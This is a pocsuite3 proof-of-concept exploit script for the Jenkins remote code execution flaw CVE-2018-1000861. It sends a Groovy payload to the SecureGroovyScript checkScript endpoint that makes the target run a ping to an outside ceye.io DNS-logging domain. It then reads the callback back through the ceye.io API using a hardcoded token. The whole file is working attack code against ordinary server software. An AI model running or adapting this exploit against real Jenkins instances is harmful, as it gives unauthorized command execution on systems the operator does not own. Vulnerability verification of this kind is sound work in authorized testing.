#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase
from pocsuite3.lib.utils import random_str

class Jenkins(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-13'
    updateDate = '2019-11-13'
    references = ['']
    name = 'Jenkins Remote Code Execution (CVE-2018-1000861)'
    appPowerLink = ''
    appName = 'Jenkins'
    appVersion = 'all'
    vulType = 'rce'
    desc = ''' 
    Jenkins Remote Code Execution (CVE-2018-1000861)
    '''

    def _verify(self):
        result = {}
        cmd = random_str(16) + '.6eb4yw.ceye.io'
        cmd2 = 'ping ' + cmd
        payload = 'public class x{public x(){new String("%s").execute()}}' % cmd2
        try:
            if self.url[-1] == '/':
                url = self.url + 'securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'
            else:
                url = self.url + '/' + 'securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'
            params = {
                'sandbox': True,
                'value': payload
            }
            attack = requests.get(
                url=url,
                verify=False,
                params=params
            )
            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if cmd in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerability')
        return output

register_poc(Jenkins)